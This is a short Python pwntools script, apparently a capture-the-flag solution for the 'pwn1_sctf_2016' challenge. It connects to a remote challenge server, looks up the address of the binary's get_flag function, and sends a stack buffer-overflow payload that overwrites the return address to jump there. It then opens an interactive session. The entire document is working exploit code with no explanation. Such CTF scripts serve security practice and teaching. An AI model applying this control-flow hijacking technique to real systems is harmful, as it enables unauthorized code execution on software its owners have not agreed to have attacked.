from pwn import *

io = remote('node4.buuoj.cn', 28082)
e = ELF('pwn1_sctf_2016')
address = e.symbols['get_flag']
log.success('get_flag_address => %s' % hex(address).upper())
payload = b'I'*20 + b'a'*0x04 + p32(address)
# payload = b'I'*20 + b'a'*0x04 + p32(0x8048F0D)
io.sendline(payload)
io.interactive()